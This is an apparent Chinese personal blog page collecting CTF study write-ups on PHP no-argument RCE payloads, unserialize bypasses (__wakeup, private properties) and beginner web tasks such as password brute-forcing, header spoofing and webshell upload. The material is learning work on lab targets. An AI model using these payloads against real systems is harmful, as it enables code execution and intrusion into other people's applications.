<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="YTsang"><meta name="copyright" content="YTsang"><title>Y. blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Y. blog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Y. blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/14/%E6%97%A0%E5%8F%82%E6%95%B0rce%E5%AD%A6%E4%B9%A0/">无参数rce学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-14</time><div class="content"><h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>无参数rec，即在不使用参数的条件下，仅使用函数进行REC，简单点来说就是用函数无限套娃，而函数产生的信息就是我们要的参数。<br>一般题目中有这段代码基本就是无参数rec的题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="无参数rce相关常用函数"><a href="#无参数rce相关常用函数" class="headerlink" title="无参数rce相关常用函数"></a>无参数rce相关常用函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>

<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><blockquote>
<p>靶机地址：<a target="_blank" rel="noopener" href="http://47.98.234.232:28026/">http://47.98.234.232:28026</a></p>
</blockquote>
<ul>
<li><p>首先先看一下题目源码,可以确定是无参数rce的题<br><img src="https://note.youdao.com/yws/api/personal/file/WEB190740577631b4552b688aafc6134207?method=download&shareKey=43f2dd47cdcef0763175d59cfaa32d12"></p>
</li>
<li><p>看一下这个正则匹配，这样就被匹配到了<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7366994734dcefc5f95d341e8899a808?method=download&shareKey=0092142c205158ebed6a554affdc33ff"></p>
</li>
<li><p>那试一下在里面输入参数呢？这样就没被正则匹配到<br><img src="https://note.youdao.com/yws/api/personal/file/WEB1207e6faa2112776e8509fa940fa70bf?method=download&shareKey=cf9257729dc728e41ad7c2b409070ca4"></p>
</li>
<li><p>那在里面嵌套函数呢？这样就能被匹配，说明只能用函数嵌套来解决这道题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBd8deeaa962e792a3f7a74cdd0a8bc8b4?method=download&shareKey=c73fd1f015face5103b1b4de802300e9"></p>
</li>
<li><p>那接下来就想办法用函数嵌套来获取flag<br>要获取flag就得先看目录，上面说到scandir()这个函数可以看目录，我们试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(scandir(&#39;.&#39;)); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe42689c9641963351c7d8ad5350f367b?method=download&shareKey=55b0a89990693627e995107871350373"></p>
</li>
</ul>
<p>但这个函数有个问题，就是需要带个参数(‘.’),而通过上面知道不能出现这种参数，那接下来的问题就是怎么用函数构造点</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>上面说到localeconv()这个函数包含了点，那用这个函数试一下。</p>
<ul>
<li><p>而点是这个函数的第一个元素，那么用current()、pos()都可以，这里用pos()试试,构造出点<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2cc45007ee08d02df65a4f3cb03de3a9?method=download&shareKey=e5898ef841f2f9adf2b7400e1108ff24"></p>
</li>
<li><p>那把这几个函数嵌套试一下,成功读取目录<br><img src="https://note.youdao.com/yws/api/personal/file/WEB80a97b87588c18492cceedfd5293464a?method=download&shareKey=740e24a284c6589bfa8aaced1a1e869b"></p>
</li>
<li><p>传参进去，发现flag，而且是在最后<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe54d30a1f12b509ec4ca385c916f0fb0?method=download&shareKey=aa9b0e6eba0468582c544b169b04c254"></p>
</li>
<li><p>用end()就可以读取最后一个<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3dca95f74e5682095fefe33060589ff0?method=download&shareKey=3df69be5baba4045f0850404b2cfb32b"></p>
</li>
<li><p>再用readfile()查看文件，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB405d647ad8258fa2552ebcddc76fbf39?method=download&shareKey=b74f1362b65419a3036941777de6ed28"></p>
</li>
</ul>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了上面这种方法构造点，还有另一种方法也可以构造点</p>
<ul>
<li>利用当前秒数构造点 ，利用localtime()中返回的秒数来构造点,在第46秒就是点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(chr(pos(localtime())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBca3f892ce0292356dc59480c0dfe56b5?method=download&shareKey=0d335cb3a16be4bf83e5c9941eb2cb1e"></p>
<ul>
<li>跟方法一一样查看文件得到flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe0d9f729ddd6ba740eb2f21d19cb3b08?method=download&shareKey=73c83ca7782216956016acb6cba5884b"></p>
<p><strong>两个构造点法都能拿到flag,但相对来说第一种方便一点，第二种需要等46秒才能得到点，比较麻烦</strong></p>
<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>也可以不用构造点来解决，可以利用SESSIONID来传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<ul>
<li>如图用bp抓包，在cookie那里改成PHPSESSID=flag.php，同样拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6a64f65d703aa7b62820c44144cba79c?method=download&shareKey=4c10b3394d772a9eb89bfcedfc2848b3"></li>
</ul>
<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><p>同样也可以利用getallheaders()来获取参数RCE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders())));</span><br></pre></td></tr></table></figure>
<ul>
<li>用bp抓包在最后请求头添加cat flag.php,读取flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf5605ca479e6614f8950fbac4d4e044f?method=download&shareKey=5245c619863bb8692c810516593d4653"></li>
</ul>
<h1 id="跳转目录"><a href="#跳转目录" class="headerlink" title="跳转目录"></a>跳转目录</h1><ul>
<li>当flag在上层目录时，需要跳转<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><strong>总的来说这类题就是用函数套娃来解决，但值得注意的是构造payload时括号不能少了！</strong></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E5%8F%8A%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">反序列化学习及靶机练习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-04</time><div class="content"><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><blockquote>
<p>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。<br>反序列化则相反将字符串重新恢复成对象<br><strong>序列化和反序列化本身是没有问题的，但如果被恶意控制反序列化内容，则会产生安全问题</strong></p>
</blockquote>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化函数是serialize()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class test&#123;                       &#x2F;&#x2F;这是一个类</span><br><span class="line">    	public $flag&#x3D;&#39;flag&#39;;    &#x2F;&#x2F;这是三个属性</span><br><span class="line">    	public $name&#x3D;&#39;zyt&#39;;</span><br><span class="line">    	public $age&#x3D;&#39;18&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$o &#x3D; new test();                  &#x2F;&#x2F;创建一个对象new这个类</span><br><span class="line">    echo serialize($o);               </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:4:&quot;name&quot;;s:3:&quot;zyt&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;输出结果</span><br><span class="line">O代表对象，如果数组则为A；</span><br><span class="line">4代表类名字四个字符；</span><br><span class="line">test类名</span><br><span class="line">3代表有三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化函数是unserialize()<br>通常来说就是一些魔术方法导致了反序列化漏洞<br><strong>常见的魔术方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() 当对象创建（new）时会自动调用</span><br><span class="line">__destruct() 当一个对象销毁（反序列化）时被调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用时被调用</span><br><span class="line">__sleep() 在对象在被序列化之前立即运行</span><br><span class="line">__wakeup() 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>

<p><strong>这里以unserialize1这道题为例</strong></p>
<ul>
<li><p>打开是一段php代码，审计后发现这是一道反序列化的题<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9e42758f3320977059cc651ab29e7b4c?method=download&shareKey=1b3b2932cab66f6419ff517cee3097e1"></p>
</li>
<li><p>这里用到destruct魔术方法,直接将类new成新对象，再将新对象序列化就得到payload<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc9901c19f16ea1aa63e36fc342ce6a1e?method=download&shareKey=686fe9c31b0e79e8b2629e2d1555abab"></p>
</li>
<li><p>试一下，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBcf6c6368c716fba3d8d84d2d404869b6?method=download&shareKey=67bb8881aa130e43b8b44fc381f93bfb"></p>
</li>
</ul>
<h1 id="常用的的绕过方法"><a href="#常用的的绕过方法" class="headerlink" title="常用的的绕过方法"></a>常用的的绕过方法</h1><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>wakeup()将在序列化之后立即被调用，这里有一个简单的绕过方法。<br><strong>即当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</strong><br>这里以unserialize2这道题为例</p>
<ul>
<li><p>代码审计，这是一道反序列化的题，题目已经提示我们flag在哪<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7d0349af7e93d773051256237c11e5f0?method=download&shareKey=c417002b9024dbc03c6dfacc86bc0d35"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBa893f505de07b9d8304d464125dc425a?method=download&shareKey=a03f43d406a25c5b69858b912ca2d0dc"></p>
</li>
<li><p>直接序列化试一下，发现有不可见字符<br><img src="https://note.youdao.com/yws/api/personal/file/WEBd1ebc883757a9605d2e5aa8c49f4c8d6?method=download&shareKey=b8ca263c3e927603e61ffbad29415f26"></p>
</li>
<li><p>重新看下代码，发现需要base64编码，试一下得到payload<br><img src="https://note.youdao.com/yws/api/personal/file/WEB40ad966f0b79cbf4c6836318df3c74fe?method=download&shareKey=bae393e328c878e9adf3c1c267e48a16"></p>
</li>
<li><p>打开后显示stop hacking！，原来正则没绕过<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe494156e657eb38d1809954c26d5a194?method=download&shareKey=4f92655040aa8959fbeed508816601ec"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBf213fb270ebaae422268279f8b998475?method=download&shareKey=bdb9e3b0e0b0d4dccb112372c17f3187"></p>
</li>
<li><p>这里正则匹配的是O:4:,用+号代替空格绕过<br><img src="https://note.youdao.com/yws/api/personal/file/WEB8b5556c67e3a8223144f62a69bdf4bc1?method=download&shareKey=eb3604ddbf3ad87a366ceb189fddd82a"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB4562d417da50e34e7bab64e5b43e9092?method=download&shareKey=378f91f097355e52291a42bea2c529a3"></p>
</li>
<li><p>还是不行，这里发现wakeup没被绕过,把属性个数1改成2，得到payload<br><img src="https://note.youdao.com/yws/api/personal/file/WEB8b82572e83e0aca27529f9a67426fed6?method=download&shareKey=c005857e62910d5155b27e76f71285ba"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBb332438555e811bd6a7a521755c7cf3c?method=download&shareKey=979995850e43407df92d83f1a9e1d249"></p>
</li>
<li><p>试一下，成功绕过，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf0ec78a3f7d8e6e96fd606556723d885?method=download&shareKey=bfe50b33ef8225aa4bf4c370d832df50"></p>
</li>
</ul>
<h2 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h2><p>以unserialize3这道题为例</p>
<ul>
<li><p>这段代码比较长，看一下有用的<br><img src="https://note.youdao.com/yws/api/personal/file/WEB458e07a74ac9bab6009d72e503591ec8?method=download&shareKey=17e8209199a72fbbbf395a4dacfc70e3"></p>
</li>
<li><p>这里有一个php弱类型比较的问题，举个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php              &#x2F;&#x2F;输出true</span><br><span class="line">var_dump(1&#x3D;&#x3D;&quot;1&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php              &#x2F;&#x2F;输出false</span><br><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;&quot;1&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因此我们直接op=2就行</p>
</li>
<li><p>直接序列化试一下，发现不行，有不可见字符<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3cfa6c277fcafd691d2b451c70829faa?method=download&shareKey=af35eb957140d7acbd0304eefe40cbb3"></p>
</li>
<li><p>需要把不可见字符转换为可见字符，这里将s改成S，让反序列化时能识别16进制的\00<br><img src="https://note.youdao.com/yws/api/personal/file/WEB1e45ca828ef578e45831fc313347b6b4?method=download&shareKey=f462b9f619e89317fc8b4a0e4d883c3f"></p>
</li>
<li><p>传参进去拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBed70d21e22bb9066daea1a213d5aca8e?method=download&shareKey=ecf822d7e0941fe02e08476f707cbb1f"></p>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/29/%E5%87%A0%E9%81%93%E7%AE%80%E5%8D%95web%E9%A2%98%E5%B0%8F%E8%AE%B0/">几道简单web题小记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-29</time><div class="content"><p><strong>这是在<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">xctf攻防世界</a>上做的几道简单的web题，虽然简单但也让我了解到ctf的一些解题模式和web的一些题目类型，就当作一次简单的训练，这篇小记算是简单的Writeup。</strong></p>
<h1 id="第一题view-source"><a href="#第一题view-source" class="headerlink" title="第一题view_source"></a>第一题view_source</h1><ul>
<li>先看看题目<br><img src="https://note.youdao.com/yws/api/personal/file/WEB019b6216bde549b87f640e80b8c0168b?method=download&shareKey=3b683b02296cfd0cda03cc0fe11a90a6"></li>
<li>发现无法右击，直接F12拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe694def2a903671d5704d0086cd5fcda?method=download&shareKey=c36e1bfb5f4a6d5022ce8c0421279210"></li>
</ul>
<h1 id="第二题robots"><a href="#第二题robots" class="headerlink" title="第二题robots"></a>第二题robots</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb4ccb899c215dc454d3a1b92d4f1d049?method=download&shareKey=aa40e9af15edd5e1c6811fab7a9302a8"></li>
</ul>
<p><strong>先百度一下看看什么是robots</strong></p>
<blockquote>
<p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。</p>
</blockquote>
<ul>
<li>那先看一下robots.txt<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf4a0a94e2ad828276f8c5835f7a1ea47?method=download&shareKey=be724fac0fd87a069a00bca7506a0cb4"></li>
<li>直接访问拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB834f2ee6ff2b331ace237071437a5c75?method=download&shareKey=d1ce55c313537359d90161690e636677"></li>
</ul>
<h1 id="第三题backup"><a href="#第三题backup" class="headerlink" title="第三题backup"></a>第三题backup</h1><ul>
<li>看题，发现是要我们看备份文件，百度后知道备份文件后缀有.git .svn .swp .~ .bak .bash_history<br><img src="https://note.youdao.com/yws/api/personal/file/WEB80f8f726ba69fcce9be96a7a80f03550?method=download&shareKey=3a5da343bfc5d509ca69c3e240a0cfbd"></li>
<li>一个一个试，发现.bak可以访问，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9142d3888dba91cfee9c8ce2350ae39d?method=download&shareKey=d8441e30799610495c5c41dabe2b3e66"></li>
</ul>
<h1 id="第四题cookie"><a href="#第四题cookie" class="headerlink" title="第四题cookie"></a>第四题cookie</h1><ul>
<li>看题，提示我们看cookie<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb2aedd20baa08e463af3479bc6cc4d99?method=download&shareKey=92198f3d99ac328720b537f8774c6606"></li>
<li>cookie简单说就是一种存储，直接F12看cookie<br><img src="https://note.youdao.com/yws/api/personal/file/WEBea696f24dc5dcf3643c806347bd27387?method=download&shareKey=4c49cc7ee5af81dc177d0a37eb1ae3f8"></li>
<li>访问后显示如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBafe52d29fe75342931231164b17fa6de?method=download&shareKey=bd1a240cacb0d6da86b79670fb003dc6"></li>
<li>bp一下，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB577fe7ca457c5604f014ac4978a2b4cb?method=download&shareKey=3209a699dd2d1b3971844b8be95818db"></li>
</ul>
<h1 id="第五题disabled-button"><a href="#第五题disabled-button" class="headerlink" title="第五题disabled_button"></a>第五题disabled_button</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf5f7e09212cc6e4fe0f3315af7d508e8?method=download&shareKey=ed2b0dc56b59b878b49bdf612356dec4"></li>
<li>发现按钮按不了<br><img src="https://note.youdao.com/yws/api/personal/file/WEB738d8cb28b8df5eada3c1c43edd59cac?method=download&shareKey=10fc7658830ef657eae4aa73d8869465"></li>
<li>看下源文件，发现disabled=””，应该就是这里的问题，删掉看看<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2461d1daf4eb3782b491a6fff7231544?method=download&shareKey=b7d4c985858120e02577e8e157b44246"></li>
<li>发现按钮可以按了，按下拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa6ec0a55475ebff1f4b0ba2f609c0d13?method=download&shareKey=9ac8c17f30ad8a5911104a71d7391151"></li>
</ul>
<h1 id="第六题weak-auth"><a href="#第六题weak-auth" class="headerlink" title="第六题weak_auth"></a>第六题weak_auth</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBbff0f8e80ef0c9d4bac09c795e14b36f?method=download&shareKey=42dc11afb7f31c1b5ca2e41fb359bd05"></li>
<li>随便输入账号密码，提示如图，得到账号是admin<br><img src="https://note.youdao.com/yws/api/personal/file/WEB4b03d089f4ce5c24cab12b3b92845853?method=download&shareKey=338004fe20d55f6ff9054f1655eddb6d"></li>
<li>找个字典用bp爆破，即可知密码是123456，登录拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBadc7242d1471264bfa88b92f8796ad72?method=download&shareKey=6aef4aecfcf69921c2871fb6fd09cd39"></li>
</ul>
<h1 id="第七题simple-php"><a href="#第七题simple-php" class="headerlink" title="第七题simple_php"></a>第七题simple_php</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEB628e4f16da229eb594bc990e2af58beb?method=download&shareKey=7603de10a8430cd3396d9df5a33401b9"></li>
<li>打开后发现是一段代码，分析一波<br><img src="https://note.youdao.com/yws/api/personal/file/WEB62f1b90df66886dc859d8b59052ebd36?method=download&shareKey=828dcaf0719454ee852f233fcc55ce61"></li>
</ul>
<p><strong>百度一波发现is_numeric()函数会判断如果是数字和数字字符串则返回TRUE，否则返回FALSE</strong></p>
<ul>
<li>按照要求输入，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc77dce4af5b89580ae16b161d9aad8bc?method=download&shareKey=9ca9cc802c090f4456c455e157e3e3e5"></li>
</ul>
<h1 id="第八题get-post"><a href="#第八题get-post" class="headerlink" title="第八题get_post"></a>第八题get_post</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEB45075a65630e800a5690fd8ffb0619b3?method=download&shareKey=20e05606daa4cf01c2f58ba0b9df3840"></li>
<li>发现要我们提交一个a=1的变量<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb241a13182f563213f3dc969a8d913df?method=download&shareKey=c0342da96913a7bdaed51ea59364c80a"></li>
<li>接着需要以post再提交一个b=2的变量<br><img src="https://note.youdao.com/yws/api/personal/file/WEB63d5a1023a1429bdea67302f1453e8bb?method=download&shareKey=3a5dd4f2294907fdf1d2d32be59cf83f"></li>
<li>照做拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB49ac2dcd47251f03d1f83f1092d1e9c6?method=download&shareKey=b13d8fce6846f8e643864629600ae408"></li>
</ul>
<h1 id="第九题xff-referer"><a href="#第九题xff-referer" class="headerlink" title="第九题xff_referer"></a>第九题xff_referer</h1><ul>
<li>打开发现需要用特定ip访问<br><img src="https://note.youdao.com/yws/api/personal/file/WEB729431bf844a237811751953194aa01f?method=download&shareKey=7b257538253d965feddcb7734f63838c"></li>
<li>找个工具改ip后访问，如图要来自google的访问<br><img src="https://note.youdao.com/yws/api/personal/file/WEB4d0e772198abfbc76f8de98c93e97631?method=download&shareKey=a2cbbb3ffe98c6bf310417dd408415e4"></li>
<li>bp添加”Referer:<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a> “, 拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB21289da1722b9fbc0ba0f512772918f2?method=download&shareKey=c4eb21d31c1dec215b8650c1c6be18e6"></li>
</ul>
<h1 id="第十题webshell"><a href="#第十题webshell" class="headerlink" title="第十题webshell"></a>第十题webshell</h1><ul>
<li>看题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa227f983e0386f3d39e29dc3d23a1fb6?method=download&shareKey=c53803cfca6580d43f0e730ac982df5c"></li>
<li>如图，直接用蚁剑连一下<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3351fa6ba273a5be83b69cac7e70b7ab?method=download&shareKey=e30b610c29fba3e4675139f8cacd6ce2"></li>
<li>连接成功，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB09c31ff53f3a829a6a750a5f716a11aa?method=download&shareKey=f2efa719a6586c94acad128a9e77c40d"></li>
</ul>
<h1 id="第十一题upload1"><a href="#第十一题upload1" class="headerlink" title="第十一题upload1"></a>第十一题upload1</h1><ul>
<li>这题目一看就知道是文件上传漏洞的<br><img src="https://note.youdao.com/yws/api/personal/file/WEBff9cb62c9da699641d0f5675d385fddb?method=download&shareKey=4108fe5d58a447e41bf51ba149ae61ac"></li>
<li>前端限制只能图片文件<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2cdc0cacf2340d3460e043dbe5282449?method=download&shareKey=137d89e886761354fffbe63699be3d73"></li>
<li>直接上传一个图片后缀的马，然后用bp改一下<br><img src="https://note.youdao.com/yws/api/personal/file/WEBac856ef8c75195f6e9523b74c1476b06?method=download&shareKey=558a4a3e35d2737cda09723677fabe23"></li>
<li>蚁剑连一下，成功，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBee571eaee87b813f78004b951232b440?method=download&shareKey=8c50f80e83c8ec43368391ff148dbace"></li>
</ul>
